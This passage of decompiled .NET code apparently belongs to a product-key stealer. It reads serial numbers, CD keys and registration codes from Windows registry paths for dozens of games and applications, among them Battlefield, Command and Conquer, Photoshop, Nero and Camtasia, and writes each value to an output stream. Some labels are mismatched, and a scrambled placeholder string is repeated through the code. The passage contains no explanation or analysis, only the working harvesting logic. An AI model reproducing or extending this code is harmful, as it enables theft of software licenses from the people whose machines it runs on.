					streamWriter.WriteLine("Call of Duty WAW : " + text10);
					goto IL_0378;
					IL_0378:
					num = 55;
					streamWriter.Flush();
					goto IL_0383;
					IL_0383:
					num = 56;
					streamWriter.WriteLine("");
					goto IL_0393;
					IL_0393:
					num = 57;
					streamWriter.Flush();
					goto IL_039e;
					IL_039e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_03a6;
					IL_03a6:
					num = 59;
					text11 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War", "CDKEY", null));
					goto IL_03c1;
					IL_03c1:
					num = 60;
					streamWriter.WriteLine("Dawn of War : " + text11);
					goto IL_03d8;
					IL_03d8:
					num = 61;
					streamWriter.Flush();
					goto IL_03e3;
					IL_03e3:
					num = 62;
					streamWriter.WriteLine("");
					goto IL_03f3;
					IL_03f3:
					num = 63;
					streamWriter.Flush();
					goto IL_03fe;
					IL_03fe:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0406;
					IL_0406:
					num = 65;
					text12 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "CDKEY", null));
					goto IL_0421;
					IL_0421:
					num = 66;
					streamWriter.WriteLine("Dawn of War - Dark Crusade : " + text12);
					goto IL_0438;
					IL_0438:
					num = 67;
					streamWriter.Flush();
					goto IL_0443;
					IL_0443:
					num = 68;
					streamWriter.WriteLine("");
					goto IL_0453;
					IL_0453:
					num = 69;
					streamWriter.Flush();
					goto IL_045e;
					IL_045e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0466;
					IL_0466:
					num = 71;
					text13 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "W40KCDKEY", null));
					goto IL_0481;
					IL_0481:
					num = 72;
					streamWriter.WriteLine("Dawn of War - Dark Crusade : " + text13);
					goto IL_0498;
					IL_0498:
					num = 73;
					streamWriter.Flush();
					goto IL_04a3;
					IL_04a3:
					num = 74;
					streamWriter.WriteLine("");
					goto IL_04b3;
					IL_04b3:
					num = 75;
					streamWriter.Flush();
					goto IL_04be;
					IL_04be:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_04c6;
					IL_04c6:
					num = 77;
					text14 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "WXPCDKEY", null));
					goto IL_04e1;
					IL_04e1:
					num = 78;
					streamWriter.WriteLine("Dawn of War - Dark Crusade : " + text14);
					goto IL_04f8;
					IL_04f8:
					num = 79;
					streamWriter.Flush();
					goto IL_0503;
					IL_0503:
					num = 80;
					streamWriter.WriteLine("");
					goto IL_0513;
					IL_0513:
					num = 81;
					streamWriter.Flush();
					goto IL_051e;
					IL_051e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0526;
					IL_0526:
					num = 83;
					text15 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\SEGA\\Medieval II Total War", "CDKey", null));
					goto IL_0541;
					IL_0541:
					num = 84;
					streamWriter.WriteLine("Medieval II Total War : " + text15);
					goto IL_0558;
					IL_0558:
					num = 85;
					streamWriter.Flush();
					goto IL_0563;
					IL_0563:
					num = 86;
					streamWriter.WriteLine("");
					goto IL_0573;
					IL_0573:
					num = 87;
					streamWriter.Flush();
					goto IL_057e;
					IL_057e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0586;
					IL_0586:
					num = 89;
					text16 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Golive\\5.0\\Registration", "SERIAL", null));
					goto IL_05a1;
					IL_05a1:
					num = 90;
					streamWriter.WriteLine("Adobe Goolive : " + text16);
					goto IL_05b8;
					IL_05b8:
					num = 91;
					streamWriter.Flush();
					goto IL_05c3;
					IL_05c3:
					num = 92;
					streamWriter.WriteLine("");
					goto IL_05d3;
					IL_05d3:
					num = 93;
					streamWriter.Flush();
					goto IL_05de;
					IL_05de:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_05e6;
					IL_05e6:
					num = 95;
					text17 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ahead\\Installation\\BAK\\Nero 7\\Info", "Serial7_1190555485", null));
					goto IL_0601;
					IL_0601:
					num = 96;
					streamWriter.WriteLine("Nero 7 : " + text17);
					goto IL_0618;
					IL_0618:
					num = 97;
					streamWriter.Flush();
					goto IL_0623;
					IL_0623:
					num = 98;
					streamWriter.WriteLine("");
					goto IL_0633;
					IL_0633:
					num = 99;
					streamWriter.Flush();
					goto IL_063e;
					IL_063e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0646;
					IL_0646:
					num = 101;
					text18 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACD Systems\\PicaView", "LicenseNumber", null));
					goto IL_0661;
					IL_0661:
					num = 102;
					streamWriter.WriteLine("ACDSystems PicAView : " + text18);
					goto IL_0678;
					IL_0678:
					num = 103;
					streamWriter.Flush();
					goto IL_0683;
					IL_0683:
					num = 104;
					streamWriter.WriteLine("");
					goto IL_0693;
					IL_0693:
					num = 105;
					streamWriter.Flush();
					goto IL_069e;
					IL_069e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_06a6;
					IL_06a6:
					num = 107;
					text19 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Eugen Systems\\ActOfWa", "RegNumber", null));
					goto IL_06c1;
					IL_06c1:
					num = 108;
					streamWriter.WriteLine("Act of War : " + text19);
					goto IL_06d8;
					IL_06d8:
					num = 109;
					streamWriter.Flush();
					goto IL_06e3;
					IL_06e3:
					num = 110;
					streamWriter.WriteLine("");
					goto IL_06f3;
					IL_06f3:
					num = 111;
					streamWriter.Flush();
					goto IL_06fe;
					IL_06fe:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0706;
					IL_0706:
					num = 113;
					text20 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Photoshop\\7.0\\Registration", "SERIAL", null));
					goto IL_0721;
					IL_0721:
					num = 114;
					streamWriter.WriteLine("Adobe Photoshop 7 : " + text20);
					goto IL_0738;
					IL_0738:
					num = 115;
					streamWriter.Flush();
					goto IL_0743;
					IL_0743:
					num = 116;
					streamWriter.WriteLine("");
					goto IL_0753;
					IL_0753:
					num = 117;
					streamWriter.Flush();
					goto IL_075e;
					IL_075e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0766;
					IL_0766:
					num = 119;
					text21 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced PDF Password Recovery\\Registration", "Code", null));
					goto IL_0781;
					IL_0781:
					num = 120;
					streamWriter.WriteLine("Advanced PDF Password Recovery : " + text21);
					goto IL_0798;
					IL_0798:
					num = 121;
					streamWriter.Flush();
					goto IL_07a3;
					IL_07a3:
					num = 122;
					streamWriter.WriteLine("");
					goto IL_07b3;
					IL_07b3:
					num = 123;
					streamWriter.Flush();
					goto IL_07be;
					IL_07be:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_07c6;
					IL_07c6:
					num = 125;
					text22 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced PDF Password Recovery Pro\\Registration", "Code", null));
					goto IL_07e1;
					IL_07e1:
					num = 126;
					streamWriter.WriteLine("Advanced PDF Password Recovery Pro : " + text22);
					goto IL_07f8;
					IL_07f8:
					num = 127;
					streamWriter.Flush();
					goto IL_0803;
					IL_0803:
					num = 128;
					streamWriter.WriteLine("");
					goto IL_0816;
					IL_0816:
					num = 129;
					streamWriter.Flush();
					goto IL_0824;
					IL_0824:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_082c;
					IL_082c:
					num = 131;
					text23 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced ZIP Password Recovery\\Registration", "Code", null));
					goto IL_084a;
					IL_084a:
					num = 132;
					streamWriter.WriteLine("Advanced ZIP Password Recovery : " + text23);
					goto IL_0864;
					IL_0864:
					num = 133;
					streamWriter.Flush();
					goto IL_0872;
					IL_0872:
					num = 134;
					streamWriter.WriteLine("");
					goto IL_0885;
					IL_0885:
					num = 135;
					streamWriter.Flush();
					goto IL_0893;
					IL_0893:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_089b;
					IL_089b:
					num = 137;
					text24 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sunflowers\\Anno 1701", "SerialNo", null));
					goto IL_08b9;
					IL_08b9:
					num = 138;
					streamWriter.WriteLine("Anno 1701 : " + text24);
					goto IL_08d3;
					IL_08d3:
					num = 139;
					streamWriter.Flush();
					goto IL_08e1;
					IL_08e1:
					num = 140;
					streamWriter.WriteLine("");
					goto IL_08f4;
					IL_08f4:
					num = 141;
					streamWriter.Flush();
					goto IL_0902;
					IL_0902:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_090a;
					IL_090a:
					num = 143;
					text25 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ashampoo\\Ashampoo WinOptimizer Platinum 3", "pYrTgbzWFEpYpYrT", null));
					goto IL_0928;
					IL_0928:
					num = 144;
					streamWriter.WriteLine("Ashamopp WinOptimizer Platinum : " + text25);
					goto IL_0942;
					IL_0942:
					num = 145;
					streamWriter.Flush();
					goto IL_0950;
					IL_0950:
					num = 146;
					streamWriter.WriteLine("");
					goto IL_0963;
					IL_0963:
					num = 147;
					streamWriter.Flush();
					goto IL_0971;
					IL_0971:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0979;
					IL_0979:
					num = 149;
					text26 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\@stake\\LC5\\Registration", "Unlock Code", null));
					goto IL_0997;
					IL_0997:
					num = 150;
					streamWriter.WriteLine("AV Voice Changer : " + text26);
					goto IL_09b1;
					IL_09b1:
					num = 151;
					streamWriter.Flush();
					goto IL_09bf;
					IL_09bf:
					num = 152;
					streamWriter.WriteLine("");
					goto IL_09d2;
					IL_09d2:
					num = 153;
					streamWriter.Flush();
					goto IL_09e0;
					IL_09e0:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_09e8;
					IL_09e8:
					num = 155;
					text27 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942", "ergc", null));
					goto IL_0a06;
					IL_0a06:
					num = 156;
					streamWriter.WriteLine("Battlefield(1942) : " + text27);
					goto IL_0a20;
					IL_0a20:
					num = 157;
					streamWriter.Flush();
					goto IL_0a2e;
					IL_0a2e:
					num = 158;
					streamWriter.WriteLine("");
					goto IL_0a41;
					IL_0a41:
					num = 159;
					streamWriter.Flush();
					goto IL_0a4f;
					IL_0a4f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0a57;
					IL_0a57:
					num = 161;
					text28 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII", "ergc", null));
					goto IL_0a75;
					IL_0a75:
					num = 162;
					streamWriter.WriteLine("Battlefield 1942 Secret Weapons of WWII : " + text28);
					goto IL_0a8f;
					IL_0a8f:
					num = 163;
					streamWriter.Flush();
					goto IL_0a9d;
					IL_0a9d:
					num = 164;
					streamWriter.WriteLine("");
					goto IL_0ab0;
					IL_0ab0:
					num = 165;
					streamWriter.Flush();
					goto IL_0abe;
					IL_0abe:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0ac6;
					IL_0ac6:
					num = 167;
					text29 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome", "ergc", null));
					goto IL_0ae4;
					IL_0ae4:
					num = 168;
					streamWriter.WriteLine("Battlefield 1942 The Road to Rome : " + text29);
					goto IL_0afe;
					IL_0afe:
					num = 169;
					streamWriter.Flush();
					goto IL_0b0c;
					IL_0b0c:
					num = 170;
					streamWriter.WriteLine("");
					goto IL_0b1f;
					IL_0b1f:
					num = 171;
					streamWriter.Flush();
					goto IL_0b2d;
					IL_0b2d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0b35;
					IL_0b35:
					num = 173;
					text30 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Battlefield 2", "ergc", null));
					goto IL_0b53;
					IL_0b53:
					num = 174;
					streamWriter.WriteLine("Battlefield 2 : " + text30);
					goto IL_0b6d;
					IL_0b6d:
					num = 175;
					streamWriter.Flush();
					goto IL_0b7b;
					IL_0b7b:
					num = 176;
					streamWriter.WriteLine("");
					goto IL_0b8e;
					IL_0b8e:
					num = 177;
					streamWriter.Flush();
					goto IL_0b9c;
					IL_0b9c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0ba4;
					IL_0ba4:
					num = 179;
					text31 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 2142", "ergc", null));
					goto IL_0bc2;
					IL_0bc2:
					num = 180;
					streamWriter.WriteLine("Battlefield(2142) : " + text31);
					goto IL_0bdc;
					IL_0bdc:
					num = 181;
					streamWriter.Flush();
					goto IL_0bea;
					IL_0bea:
					num = 182;
					streamWriter.WriteLine("");
					goto IL_0bfd;
					IL_0bfd:
					num = 183;
					streamWriter.Flush();
					goto IL_0c0b;
					IL_0c0b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0c13;
					IL_0c13:
					num = 185;
					text32 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam", "ergc", null));
					goto IL_0c31;
					IL_0c31:
					num = 186;
					streamWriter.WriteLine("Battlefield Vietnam : " + text32);
					goto IL_0c4b;
					IL_0c4b:
					num = 187;
					streamWriter.Flush();
					goto IL_0c59;
					IL_0c59:
					num = 188;
					streamWriter.WriteLine("");
					goto IL_0c6c;
					IL_0c6c:
					num = 189;
					streamWriter.Flush();
					goto IL_0c7a;
					IL_0c7a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0c82;
					IL_0c82:
					num = 191;
					text33 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Black and White", "ergc", null));
					goto IL_0ca0;
					IL_0ca0:
					num = 192;
					streamWriter.WriteLine("Black and White : " + text33);
					goto IL_0cba;
					IL_0cba:
					num = 193;
					streamWriter.Flush();
					goto IL_0cc8;
					IL_0cc8:
					num = 194;
					streamWriter.WriteLine("");
					goto IL_0cdb;
					IL_0cdb:
					num = 195;
					streamWriter.Flush();
					goto IL_0ce9;
					IL_0ce9:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0cf1;
					IL_0cf1:
					num = 197;
					text34 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Black and White 2", "ergc", null));
					goto IL_0d0f;
					IL_0d0f:
					num = 198;
					streamWriter.WriteLine("Black and White 2 : " + text34);
					goto IL_0d29;
					IL_0d29:
					num = 199;
					streamWriter.Flush();
					goto IL_0d37;
					IL_0d37:
					num = 200;
					streamWriter.WriteLine("");
					goto IL_0d4a;
					IL_0d4a:
					num = 201;
					streamWriter.Flush();
					goto IL_0d58;
					IL_0d58:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0d60;
					IL_0d60:
					num = 203;
					text35 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Boulder Dash Rocks", "ergc", null));
					goto IL_0d7e;
					IL_0d7e:
					num = 204;
					streamWriter.WriteLine("Boulder Dash Rocks : " + text35);
					goto IL_0d98;
					IL_0d98:
					num = 205;
					streamWriter.Flush();
					goto IL_0da6;
					IL_0da6:
					num = 206;
					streamWriter.WriteLine("");
					goto IL_0db9;
					IL_0db9:
					num = 207;
					streamWriter.Flush();
					goto IL_0dc7;
					IL_0dc7:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0dcf;
					IL_0dcf:
					num = 209;
					text36 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Burnout Paradise", "ergc", null));
					goto IL_0ded;
					IL_0ded:
					num = 210;
					streamWriter.WriteLine("Burnout Paradise : " + text36);
					goto IL_0e07;
					IL_0e07:
					num = 211;
					streamWriter.Flush();
					goto IL_0e15;
					IL_0e15:
					num = 212;
					streamWriter.WriteLine("");
					goto IL_0e28;
					IL_0e28:
					num = 213;
					streamWriter.Flush();
					goto IL_0e36;
					IL_0e36:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0e3e;
					IL_0e3e:
					num = 215;
					text37 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\4.0", "RegisteredTo", null));
					goto IL_0e5c;
					IL_0e5c:
					num = 216;
					streamWriter.WriteLine("Camtasia Studio 4(Name) : " + text37);
					goto IL_0e76;
					IL_0e76:
					num = 217;
					streamWriter.Flush();
					goto IL_0e84;
					IL_0e84:
					num = 218;
					streamWriter.WriteLine("");
					goto IL_0e97;
					IL_0e97:
					num = 219;
					streamWriter.Flush();
					goto IL_0ea5;
					IL_0ea5:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0ead;
					IL_0ead:
					num = 221;
					text38 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\4.0", "RegistrationKey", null));
					goto IL_0ecb;
					IL_0ecb:
					num = 222;
					streamWriter.WriteLine("Camtasia Studio 4(pYrTgbzWFEpYpYrT) : " + text38);
					goto IL_0ee5;
					IL_0ee5:
					num = 223;
					streamWriter.Flush();
					goto IL_0ef3;
					IL_0ef3:
					num = 224;
					streamWriter.WriteLine("");
					goto IL_0f06;
					IL_0f06:
					num = 225;
					streamWriter.Flush();
					goto IL_0f14;
					IL_0f14:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0f1c;
					IL_0f1c:
					num = 227;
					text39 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Techland\\Chrome", "SerialNumber", null));
					goto IL_0f3a;
					IL_0f3a:
					num = 228;
					streamWriter.WriteLine("Chrome : " + text39);
					goto IL_0f54;
					IL_0f54:
					num = 229;
					streamWriter.Flush();
					goto IL_0f62;
					IL_0f62:
					num = 230;
					streamWriter.WriteLine("");
					goto IL_0f75;
					IL_0f75:
					num = 231;
					streamWriter.Flush();
					goto IL_0f83;
					IL_0f83:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0f8b;
					IL_0f8b:
					num = 233;
					text40 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Codec Tweak Tool", "serial", null));
					goto IL_0fa9;
					IL_0fa9:
					num = 234;
					streamWriter.WriteLine("Codec Tweak Tool : " + text40);
					goto IL_0fc3;
					IL_0fc3:
					num = 235;
					streamWriter.Flush();
					goto IL_0fd1;
					IL_0fd1:
					num = 236;
					streamWriter.WriteLine("");
					goto IL_0fe4;
					IL_0fe4:
					num = 237;
					streamWriter.Flush();
					goto IL_0ff2;
					IL_0ff2:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0ffa;
					IL_0ffa:
					num = 239;
					text41 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Generals", "ergc", null));
					goto IL_1018;
					IL_1018:
					num = 240;
					streamWriter.WriteLine("Command and Conquer Generals : " + text41);
					goto IL_1032;
					IL_1032:
					num = 241;
					streamWriter.Flush();
					goto IL_1040;
					IL_1040:
					num = 242;
					streamWriter.WriteLine("");
					goto IL_1053;
					IL_1053:
					num = 243;
					streamWriter.Flush();
					goto IL_1061;
					IL_1061:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1069;
					IL_1069:
					num = 245;
					text42 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour", "ergc", null));
					goto IL_1087;
					IL_1087:
					num = 246;
					streamWriter.WriteLine("Command and Conquer Generals Zero Hour : " + text42);
					goto IL_10a1;
					IL_10a1:
					num = 247;
					streamWriter.Flush();
					goto IL_10af;
					IL_10af:
					num = 248;
					streamWriter.WriteLine("");
					goto IL_10c2;
					IL_10c2:
					num = 249;
					streamWriter.Flush();
					goto IL_10d0;
					IL_10d0:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_10d8;
					IL_10d8:
					num = 251;
					text43 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert 2", "Serial", null));
					goto IL_10f6;
					IL_10f6:
					num = 252;
					streamWriter.WriteLine("Red Alert 2 : " + text43);
					goto IL_1110;
					IL_1110:
					num = 253;
					streamWriter.Flush();
					goto IL_111e;
					IL_111e:
					num = 254;
					streamWriter.WriteLine("");
					goto IL_1131;
					IL_1131:
					num = 255;
					streamWriter.Flush();
					goto IL_113f;
					IL_113f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1147;
					IL_1147:
					num = 257;
					text44 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert", "Serial", null));
					goto IL_1165;
					IL_1165:
					num = 258;
					streamWriter.WriteLine("Red Alert : " + text44);
					goto IL_117f;
					IL_117f:
					num = 259;
					streamWriter.Flush();
					goto IL_118d;
					IL_118d:
					num = 260;
					streamWriter.WriteLine("");
					goto IL_11a0;
					IL_11a0:
					num = 261;
					streamWriter.Flush();
					goto IL_11ae;
					IL_11ae:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_11b6;
					IL_11b6:
					num = 263;
					text45 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Tiberian Sun", "Serial", null));
					goto IL_11d4;
					IL_11d4:
					num = 264;
					streamWriter.WriteLine("Command and Conquer Tiberian Sun : " + text45);
					goto IL_11ee;
					IL_11ee:
					num = 265;
					streamWriter.Flush();
					goto IL_11fc;
					IL_11fc:
					num = 266;
					streamWriter.WriteLine("");
					goto IL_120f;
					IL_120f:
					num = 267;
					streamWriter.Flush();
					goto IL_121d;
					IL_121d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1225;
					IL_1225:
					num = 269;
					text46 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Command and Conquer 3", "ergc", null));
					goto IL_1243;
					IL_1243:
					num = 270;
					streamWriter.WriteLine("Command and Conquer 3 : " + text46);
					goto IL_125d;
					IL_125d:
					num = 271;
					streamWriter.Flush();
					goto IL_126b;
					IL_126b:
					num = 272;
					streamWriter.WriteLine("");
					goto IL_127e;
					IL_127e:
					num = 273;
					streamWriter.Flush();
					goto IL_128c;
					IL_128c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1294;
					IL_1294:
					num = 275;
					text47 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Command and Conquer 3", "ergc", null));
					goto IL_12b2;
					IL_12b2:
					num = 276;
					streamWriter.WriteLine("Command and Conquer 3 : " + text47);
					goto IL_12cc;
					IL_12cc:
					num = 277;
					streamWriter.Flush();
					goto IL_12da;
					IL_12da:
					num = 278;
					streamWriter.WriteLine("");
					goto IL_12ed;
					IL_12ed:
					num = 279;
					streamWriter.Flush();
					goto IL_12fb;
					IL_12fb:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1303;
					IL_1303:
					num = 281;
					text48 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company of Heroes", "CoHProductKey", null));
					goto IL_1321;
					IL_1321:
					num = 282;
					streamWriter.WriteLine("Company of Heroes : " + text48);
					goto IL_133b;
					IL_133b:
					num = 283;
					streamWriter.Flush();
					goto IL_1349;
					IL_1349:
					num = 284;
					streamWriter.WriteLine("");
					goto IL_135c;
					IL_135c:
					num = 285;
					streamWriter.Flush();
					goto IL_136a;
					IL_136a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1372;
					IL_1372:
					num = 287;
					text49 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company of Heroes", "CoHOFProductKey", null));
					goto IL_1390;
					IL_1390:
					num = 288;
					streamWriter.WriteLine("Company of Heroes : " + text49);
					goto IL_13aa;
					IL_13aa:
					num = 289;
					streamWriter.Flush();
					goto IL_13b8;
					IL_13b8:
					num = 290;
					streamWriter.WriteLine("");
					goto IL_13cb;
					IL_13cb:
					num = 291;
					streamWriter.Flush();
					goto IL_13d9;
					IL_13d9:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_13e1;
					IL_13e1:
					num = 293;
					text50 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Counter-Strike\\Settings", "pYrTgbzWFEpYpYrT", null));
					goto IL_13ff;
					IL_13ff:
					num = 294;
					streamWriter.WriteLine("Counter-Strike : " + text50);
					goto IL_1419;
					IL_1419:
					num = 295;
					streamWriter.Flush();
					goto IL_1427;
					IL_1427:
					num = 296;
					streamWriter.WriteLine("");
					goto IL_143a;
					IL_143a:
					num = 297;
					streamWriter.Flush();
					goto IL_1448;
					IL_1448:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1450;
					IL_1450:
					num = 299;
					text51 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Crysis", "ergc", null));
					goto IL_146e;
					IL_146e:
					num = 300;
					streamWriter.WriteLine("Crysis : " + text51);
					goto IL_1488;
					IL_1488:
					num = 301;
					streamWriter.Flush();
					goto IL_1496;
					IL_1496:
					num = 302;
					streamWriter.WriteLine("");
					goto IL_14a9;
					IL_14a9:
					num = 303;
					streamWriter.Flush();
					goto IL_14b7;
					IL_14b7:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_14bf;
					IL_14bf:
					num = 305;
					text52 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerDVD", "CDKey", null));
					goto IL_14dd;
					IL_14dd:
					num = 306;
					streamWriter.WriteLine("PowerDVD : " + text52);
					goto IL_14f7;
					IL_14f7:
					num = 307;
					streamWriter.Flush();
					goto IL_1505;
					IL_1505:
					num = 308;
					streamWriter.WriteLine("");
					goto IL_1518;
					IL_1518:
					num = 309;
					streamWriter.Flush();
					goto IL_1526;
					IL_1526:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_152e;
					IL_152e:
					num = 311;
					text53 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerBar", "CDKey", null));
					goto IL_154c;
					IL_154c:
					num = 312;
					streamWriter.WriteLine("PowerBar : " + text53);
					goto IL_1566;
					IL_1566:
					num = 313;
					streamWriter.Flush();
					goto IL_1574;
					IL_1574:
					num = 314;
					streamWriter.WriteLine("");
					goto IL_1587;
					IL_1587:
					num = 315;
					streamWriter.Flush();
					goto IL_1595;
					IL_1595:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_159d;
					IL_159d:
					num = 317;
					text54 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CyberLink\\PowerProducer\\3.0\\UserReg", "SR_No", null));
					goto IL_15bb;
					IL_15bb:
					num = 318;
					streamWriter.WriteLine("CyberLink PowerProducer : " + text54);
					goto IL_15d5;
					IL_15d5:
					num = 319;
					streamWriter.Flush();
					goto IL_15e3;
					IL_15e3:
					num = 320;
					streamWriter.WriteLine("");
					goto IL_15f6;
					IL_15f6:
					num = 321;
					streamWriter.Flush();
					goto IL_1604;
					IL_1604:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_160c;
					IL_160c:
					num = 323;
					text55 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Day of Defeat\\Settings", "pYrTgbzWFEpYpYrT", null));
					goto IL_162a;
					IL_162a:
					num = 324;
					streamWriter.WriteLine("Day of Defeat : " + text55);
					goto IL_1644;
					IL_1644:
					num = 325;
					streamWriter.Flush();
					goto IL_1652;
					IL_1652:
					num = 326;
					streamWriter.WriteLine("");
					goto IL_1665;
					IL_1665:
					num = 327;
					streamWriter.Flush();
					goto IL_1673;
					IL_1673:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_167b;
					IL_167b:
					num = 329;
					text56 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\The Battle for Middle-earth II", "ergc", null));
					goto IL_1699;
